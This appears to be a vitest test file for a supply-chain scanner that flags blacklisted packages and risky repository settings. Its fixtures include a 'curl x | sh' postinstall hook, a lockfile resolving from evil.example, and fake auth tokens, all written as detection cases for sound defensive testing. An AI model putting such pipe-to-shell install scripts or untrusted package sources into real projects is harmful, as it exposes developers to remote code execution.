import { createHash } from "node:crypto";
import { POLICY_CHECKS, type BlacklistEntry, type Finding, type PolicyCheckId } from "@pw/shared";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { createRepositories } from "../repositories/index.ts";
import { FakeClock } from "../test/clock.ts";
import { npmLockV3, pkgJson } from "../test/repoFixtures.ts";
import {
  allFindings,
  cleanupTestApps,
  createTestApp,
  listFindings,
  putSettings,
  runScan,
  type TestApp,
} from "../test/testApp.ts";
import { addEntry, listEntries } from "../test/v2.ts";
import { seedPolicyEntries } from "./policySeed.ts";
import { createPolicyRules } from "./scanPolicy.ts";
import { FakeLogger } from "../test/logger.ts";

let t: TestApp;

beforeEach(async () => {
  t = createTestApp();
  await putSettings(t);
});

afterEach(cleanupTestApps);

const entry = (ecosystem: string, name: string, versionRange: string | null = null) =>
  addEntry(t, { ecosystem, name, versionRange, reason: `${ecosystem} 악성` });

const withScripts = (name: string, scripts: Record<string, string>): string =>
  `${JSON.stringify({ name, version: "1.0.0", scripts })}
`;

const keysOf = async (): Promise<string[]> =>
  (await allFindings(t)).map((f) => `${f.ecosystem}:${f.packageName}@${f.version}|${f.filePath}`).sort();

const GEMFILE_LOCK = `GEM
  remote: https://rubygems.org/
  specs:
    evil-gem (1.0.1)
    other-gem (2.0.0)

PLATFORMS
  ruby

DEPENDENCIES
  evil-gem
`;

const PODFILE_LOCK = `PODS:
  - EvilPod (1.9.0)
  - GoodPod (3.0.0)

DEPENDENCIES:
  - EvilPod

COCOAPODS: 1.12.0
`;

describe("[SG-60] 새 패키지 종류의 검출", () => {
  it("lock 의 정확한 버전으로 rubygems·composer·cocoapods 를 검출한다", async () => {
    await entry("rubygems", "evil-gem", "= 1.0.1");
    await entry("composer", "vendor/evil", ">=1.0 <2.0");
    await entry("cocoapods", "EvilPod", "< 2.0");
    t.github.setRepos([
      {
        name: "svc",
        files: {
          Gemfile: 'gem "evil-gem"\n',
          "Gemfile.lock": GEMFILE_LOCK,
          "composer.json": JSON.stringify({ require: { "vendor/evil": "^1.0" } }),
          "composer.lock": JSON.stringify({
            packages: [
              { name: "vendor/evil", version: "v1.5.0" },
              { name: "vendor/fine", version: "1.0.0" },
            ],
          }),
          "ios/Podfile": "pod 'EvilPod'\n",
          "ios/Podfile.lock": PODFILE_LOCK,
        },
      },
    ]);

    const scan = await runScan(t);

    expect(scan.status).toBe("success");
    expect(await keysOf()).toEqual([
      "cocoapods:EvilPod@1.9.0|ios/Podfile.lock",
      "composer:vendor/evil@v1.5.0|composer.lock",
      "rubygems:evil-gem@1.0.1|Gemfile.lock",
    ]);
    const direct = (await allFindings(t)).find((f) => f.ecosystem === "rubygems");
    expect(direct?.dependencyType).toBe("direct");
  });

  it("lock 이 없으면 선언 파일에서: 정확한 버전은 범위와 비교하고 범위 spec 은 범위가 없는 항목에만 일치한다", async () => {
    await entry("rubygems", "pinned-gem", "= 1.0.1");
    await entry("rubygems", "loose-gem");
    await entry("rubygems", "ranged-gem", "= 1.0.1");
    await entry("composer", "vendor/pinned", "1.5.0");
    await entry("cocoapods", "PinnedPod", "= 2.0.0");
    t.github.setRepos([
      {
        name: "svc",
        files: {
          Gemfile: `gem "pinned-gem", "= 1.0.1"\ngem "loose-gem", "~> 1.0"\ngem "ranged-gem", "~> 1.0"\ngem "git-gem", git: "https://x.io/g.git"\n`,
          "composer.json": JSON.stringify({ require: { php: ">=8", "vendor/pinned": "1.5.0" } }),
          Podfile: "pod 'PinnedPod', '2.0.0'\n",
        },
      },
    ]);

    await runScan(t);

    expect(await keysOf()).toEqual([
      "cocoapods:PinnedPod@2.0.0|Podfile",
      "composer:vendor/pinned@1.5.0|composer.json",
      "rubygems:loose-gem@~> 1.0|Gemfile",
      "rubygems:pinned-gem@1.0.1|Gemfile",
    ]);
  });

  it("vendor/·Pods/ 안의 선언 파일은 읽지 않는다", async () => {
    await entry("rubygems", "evil-gem");
    t.github.setRepos([{ name: "svc", files: { "vendor/bundle/Gemfile.lock": GEMFILE_LOCK, "vendor/bundle/Gemfile": 'gem "evil-gem"\n', README: "x" } }]);

    await runScan(t);

    expect(await keysOf()).toEqual([]);
  });

  it("[SG-61] 브랜치에서는 lock 만 바뀌어도 새 종류의 lock 을 평가한다", async () => {
    await entry("rubygems", "evil-gem", "= 1.0.1");
    const clean = GEMFILE_LOCK.replace("evil-gem (1.0.1)", "evil-gem (1.0.0)");
    t.github.setRepos([
      { name: "svc", files: { Gemfile: 'gem "evil-gem"\n', "Gemfile.lock": clean }, pushedAt: "2026-11-11T00:00:00.000Z" },
    ]);
    t.github.setHead("svc", "feature/x", {
      committedAt: "2026-11-10T00:00:00.000Z",
      files: { Gemfile: 'gem "evil-gem"\n', "Gemfile.lock": GEMFILE_LOCK },
    });

    await runScan(t);

    const found = await allFindings(t);
    expect(found.map((f) => `${f.ref}|${f.filePath}|${f.version}`)).toEqual(["feature/x|Gemfile.lock|1.0.1"]);
  });
});

const WF_FILES = {
  ".vscode/extensions.json": '{ "recommendations": ["Evil.Ext@1.0.0", "other.ext"] }',
  "Chart.yaml": "name: app\ndependencies:\n  - name: redis\n    version: 17.1.0\n  - name: pg\n    version: ^1.0.0\n",
  "infra/main.tf": 'module "a" {\n  source = "x/y/z"\n  version = "1.0.0"\n}\nmodule "b" {\n  source = "p/q/r"\n  version = "~> 2.0"\n}\n',
};

describe("[SG-62] 새 CI 종류의 검출", () => {
  it("vscode·helm·terraform: 정확한 버전은 범위와 비교하고 버전이 없으면 범위가 없는 항목에만 일치한다", async () => {
    await entry("vscode", "evil.ext", "1.0.0, 1.0.1");
    await entry("helm", "redis", "17.1.0");
    await entry("helm", "pg", "1.0.0");
    await entry("terraform", "x/y/z", "1.0.0");
    await entry("terraform", "p/q/r", "2.0.0");
    await entry("terraform", "p/q/r");
    t.github.setRepos([{ name: "svc", files: WF_FILES }]);

    const scan = await runScan(t);

    expect(scan.status).toBe("success");
    expect(await keysOf()).toEqual([
      "helm:redis@17.1.0|Chart.yaml",
      "terraform:p/q/r@|infra/main.tf",
      "terraform:x/y/z@1.0.0|infra/main.tf",
      "vscode:evil.ext@1.0.0|.vscode/extensions.json",
    ]);
  });

  it("[SG-63] 그 종류의 활성 항목이 없으면 그 파일을 받지 않는다", async () => {
    await entry("npm", "evil-pkg");
    t.github.setRepos([{ name: "svc", files: { ...WF_FILES, ".npmrc": "registry=https://x.io/", ".gitmodules": "" } }]);

    await runScan(t);
    expect(t.github.callsOf("getFile", "svc")).toHaveLength(0);

    await entry("vscode", "evil.ext");
    await runScan(t);
    expect(t.github.callsOf("getFile", "svc")).toHaveLength(1);
  });

  it("잘못된 파일 1개는 그 파일만 건너뛰고 repo 는 실패하지 않는다", async () => {
    await entry("helm", "redis");
    await entry("vscode", "evil.ext");
    t.github.setRepos([
      { name: "svc", files: { "Chart.yaml": "a: [", ".vscode/extensions.json": '{"recommendations":["evil.ext"]}' } },
    ]);

    const scan = await runScan(t);

    expect(scan.status).toBe("success");
    expect(await keysOf()).toEqual(["vscode:evil.ext@|.vscode/extensions.json"]);
    expect(t.logger.texts("warn").join("\n")).toContain("Chart.yaml");
  });
});

// ---------------------------------------------------------------- 내장 검사

describe("내장 검사 5개", () => {
  let policyApp: TestApp;

  beforeEach(async () => {
    policyApp = createTestApp({ seedPolicy: true });
    await putSettings(policyApp);
  });

  const policyEntries = (): Promise<BlacklistEntry[]> => listEntries(policyApp, { ecosystem: "policy" });

  async function only(...ids: PolicyCheckId[]): Promise<void> {
    const entries = await policyEntries();
    const off = entries.filter((item) => !ids.includes(item.name as PolicyCheckId)).map((item) => item.id);
    const res = await policyApp.request("POST", "/api/blacklist/bulk", { action: "disable", ids: off });
    expect(res.status, res.text).toBe(200);
  }

  async function found(id: PolicyCheckId): Promise<string[]> {
    const target = (await policyEntries()).find((item) => item.name === id);
    return (await listFindings(policyApp, { category: "policy" })).items
      .filter((f: Finding) => f.blacklistEntryId === target?.id && f.status !== "resolved")
      .map((f) => `${f.filePath}|${f.packageName}|${f.version}`)
      .sort();
  }

  const hash12 = (text: string): string => createHash("sha256").update(text).digest("hex").slice(0, 12);

  it("[SG-64] 시작할 때 16개가 있고 workflow-changed·new-committer 는 평가되지 않아도 스캔이 성공한다", async () => {
    expect(await policyEntries()).toHaveLength(16);
    policyApp.github.setRepos([{ name: "svc", files: { "package.json": pkgJson(), "package-lock.json": npmLockV3({}) } }]);

    const scan = await runScan(policyApp);

    expect(scan.status).toBe("success");
    expect(policyApp.logger.texts("error")).toEqual([]);
  });

  it("[SG-65] install-script: 설치 script 마다 1건이고 내용이 바뀌면 다른 검출이다", async () => {
    await only("install-script");
    const post = "node scripts/setup.js";
    const files = {
      "package.json": withScripts("app", { postinstall: post, preinstall: "echo hi", test: "vitest", prepare: "x" }),
      "tools/package.json": withScripts("tools", { install: "node-gyp rebuild" }),
      "node_modules/x/package.json": withScripts("x", { postinstall: "evil" }),
      "vendor/y/package.json": withScripts("y", { postinstall: "evil" }),
    };
    policyApp.github.setRepos([{ name: "svc", files }]);

    await runScan(policyApp);

    expect(await found("install-script")).toEqual(
      [
        `package.json|postinstall|${hash12(post)}`,
        `package.json|preinstall|${hash12("echo hi")}`,
        `tools/package.json|install|${hash12("node-gyp rebuild")}`,
      ].sort(),
    );

    policyApp.github.setRepos([
      { name: "svc", files: { ...files, "package.json": withScripts("app", { postinstall: "curl x | sh" }) } },
    ]);
    await runScan(policyApp);

    expect(await found("install-script")).toContain(`package.json|postinstall|${hash12("curl x | sh")}`);
    expect(await found("install-script")).not.toContain(`package.json|postinstall|${hash12(post)}`);
  });

  it("[SG-66] lock-external-source: lock 파일 × host 마다 1건이고 값은 비어 있다", async () => {
    await only("lock-external-source");
    const npmLock = JSON.parse(npmLockV3({ a: "1.0.0", b: "1.0.0", c: "1.0.0" })) as {
      packages: Record<string, { resolved?: string }>;
    };
    (npmLock.packages["node_modules/a"] as { resolved?: string }).resolved = "https://npm.acme.io/a/-/a-1.0.0.tgz";
    (npmLock.packages["node_modules/b"] as { resolved?: string }).resolved = "https://npm.acme.io/b/-/b-1.0.0.tgz";
    (npmLock.packages["node_modules/c"] as { resolved?: string }).resolved = "file:../c";
    policyApp.github.setRepos([
      {
        name: "svc",
        files: {
          "package.json": pkgJson(),
          "package-lock.json": JSON.stringify(npmLock),
          "web/yarn.lock": '# yarn lockfile v1\n\nx@^1.0.0:\n  version "1.0.0"\n  resolved "https://registry.yarnpkg.com/x/-/x-1.0.0.tgz#a"\n\ny@^1.0.0:\n  version "1.0.0"\n  resolved "https://evil.example/y.tgz#b"\n',
        },
      },
    ]);

    await runScan(policyApp);

    expect(await found("lock-external-source")).toEqual(["package-lock.json|npm.acme.io|", "web/yarn.lock|evil.example|"]);
  });

  it("[SG-67] custom-registry: 파일 × host 마다 1건 (pypi 항목이 없어도 requirements·pyproject 를 읽는다)", async () => {
    await only("custom-registry");
    policyApp.github.setRepos([
      {
        name: "svc",
        files: {
          ".npmrc": "registry=https://registry.npmjs.org/\n@acme:registry=https://npm.acme.io/\n",
          ".pip/pip.conf": "[global]\nextra-index-url = https://pypi.acme.io/simple\n",
          "uv.toml": '[[index]]\nurl = "https://uv.acme.io/simple"\n',
          "requirements-dev.txt": "--extra-index-url https://req.acme.io/simple\nrequests==2.0\n",
          "pyproject.toml": '[[tool.poetry.source]]\nname = "x"\nurl = "https://poetry.acme.io/simple"\n',
          "sub/requirements.txt": "--index-url https://pypi.org/simple\n",
        },
      },
    ]);

    await runScan(policyApp);

    expect(await found("custom-registry")).toEqual(
      [
        ".npmrc|npm.acme.io|",
        ".pip/pip.conf|pypi.acme.io|",
        "pyproject.toml|poetry.acme.io|",
        "requirements-dev.txt|req.acme.io|",
        "uv.toml|uv.acme.io|",
      ].sort(),
    );
  });

  it("[SG-68] npmrc-token: 토큰의 값은 검출·로그·메일 어디에도 없다", async () => {
    await only("npmrc-token");
    const secret = "ghp_SuperSecretValue1234567890";
    policyApp.github.setRepos([
      {
        name: "svc",
        files: {
          ".npmrc": `//npm.pkg.github.com/:_authToken=${secret}\n_auth=\${NPM_AUTH}\n`,
          "web/.npmrc": "//npm.pkg.github.com/:_authToken=${NPM_TOKEN}\n",
          ".yarnrc.yml": 'npmAuthToken: "yarn-secret-token-9999"\n',
        },
      },
    ]);

    await runScan(policyApp);

    expect(await found("npmrc-token")).toEqual([".npmrc|_authToken|", ".yarnrc.yml|npmAuthToken|"]);
    const everything = [
      JSON.stringify(await listFindings(policyApp)),
      JSON.stringify(policyApp.logger.entries),
      policyApp.mailer.sentText(),
    ].join("\n");
    expect(everything).not.toContain("SuperSecret");
    expect(everything).not.toContain("yarn-secret-token");
  });

  it("[SG-69] external-submodule: 같은 org(https·git@, 대소문자 무시)와 상대 경로는 제외하고 자격 증명은 떼서 보고한다", async () => {
    await only("external-submodule");
    policyApp.github.setRepos([
      {
        name: "svc",
        files: {
          ".gitmodules": [
            '[submodule "same"]\n\turl = https://github.com/My-Org/lib.git',
            '[submodule "ssh"]\n\turl = git@github.com:my-org/lib2.git',
            '[submodule "rel"]\n\turl = ../sibling',
            '[submodule "prefix"]\n\turl = https://github.com/my-org-evil/x.git',
            '[submodule "ext"]\n\turl = https://user:pw@github.com/other/x.git',
            '[submodule "gitlab"]\n\turl = https://gitlab.com/my-org/x.git',
          ].join("\n"),
        },
      },
    ]);

    await runScan(policyApp);

    expect(await found("external-submodule")).toEqual([
      ".gitmodules|https://github.com/my-org-evil/x.git|",
      ".gitmodules|https://github.com/other/x.git|",
      ".gitmodules|https://gitlab.com/my-org/x.git|",
    ]);
  });

  it("[SG-70] 검사 1개 × repo 1개의 상한은 100건이다", async () => {
    const entryFor = (id: string): BlacklistEntry => ({
      id: 1,
      source: "manual",
      externalId: null,
      ecosystem: "policy",
      name: id,
      versionRange: null,
      reason: "r",
      severity: "low",
      enabled: true,
      expiresAt: null,
      isExpired: false,
      createdAt: "2026-11-16T00:00:00.000Z",
      updatedAt: "2026-11-16T00:00:00.000Z",
    });
    const rules = createPolicyRules([entryFor("external-submodule")]);
    const urls = Array.from({ length: 150 }, (_, i) => `https://x.io/r${String(i).padStart(3, "0")}.git`);

    const matches = await rules.evaluate(
      {
        org: "my-org",
        repo: "svc",
        treePaths: [],
        manifests: [],
        sources: [
          { kind: "gitmodules", path: ".gitmodules", commands: [], actions: [], images: [], hasCurlPipeShell: false, missingPermissions: false, submodules: urls },
        ],
      },
      new FakeLogger(),
    );

    expect(matches).toHaveLength(100);
    expect(matches[0]?.packageName).toBe("https://x.io/r000.git");
  });
});

describe("[SG-71] 내장 검사의 seed", () => {
  it("9개가 있는 DB 에서 시작하면 16개가 되고 기존 9개의 설정은 그대로다", () => {
    const app = createTestApp();
    const repos = createRepositories(app.instance.db);
    const clock = new FakeClock();
    const old = POLICY_CHECKS.slice(0, 9);
    for (const check of old) {
      repos.blacklist.insert(
        { ecosystem: "policy", name: check.id, versionRange: null, reason: "내가 바꾼 사유", severity: "high", enabled: false, expiresAt: null },
        "2026-11-01T00:00:00.000Z",
        "2026-11-01",
      );
    }

    const created = seedPolicyEntries(repos, clock);

    const all = repos.blacklist.list({ ecosystem: "policy", q: undefined }, "2026-11-12");
    expect(created).toBe(7);
    expect(all).toHaveLength(16);
    const kept = all.filter((item) => old.some((check) => check.id === item.name));
    expect(kept.every((item) => !item.enabled && item.severity === "high" && item.reason === "내가 바꾼 사유")).toBe(true);
    expect(all.find((item) => item.name === "npmrc-token")).toMatchObject({ severity: "high", enabled: true });
  });
});
